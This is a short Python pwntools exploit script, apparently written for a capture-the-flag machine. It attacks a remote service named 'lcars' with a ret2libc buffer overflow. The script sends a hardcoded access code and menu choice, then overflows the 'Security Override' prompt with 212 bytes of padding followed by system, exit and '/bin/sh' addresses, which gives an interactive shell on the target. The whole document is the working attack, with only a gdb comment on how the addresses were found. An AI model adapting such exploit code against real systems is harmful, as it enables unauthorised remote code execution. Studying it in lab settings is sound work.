#!/usr/bin/python3
# codind:utf-8

from pwn import *

def def_handler():
	print("\n\n[+]Saindo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Global

# gdb ./lcars || info functions || b *main || run || print system || print exit || find &system,+9999999,"sh"

offset = 212
libc = 0xf7e32000
system = 0xf7e4c060
exit = 0xf7e3faf0 
bin_sh = 0xf7f6ddd5 

def exploit():

	junk = b"A" * offset
	system_addr = p32(system)
	exit_addr = p32(exit)
	bin_sh_addr = p32(bin_sh)

	payload = junk + system_addr + exit_addr + bin_sh_addr

	context(os='linux', arch='i386')
	host,port = "10.10.10.61", 32812

	r = remote(host,port)

	r.recvuntil(b"Enter Bridge Access Code:")
	r.sendline(b"picarda1")
	r.recvuntil(b"Waiting for input:")
	r.sendline(b"4")
	r.recvuntil(b"Enter Security Override:")
	r.sendline(payload)

	r.interactive()

if __name__ == '__main__':
	exploit()
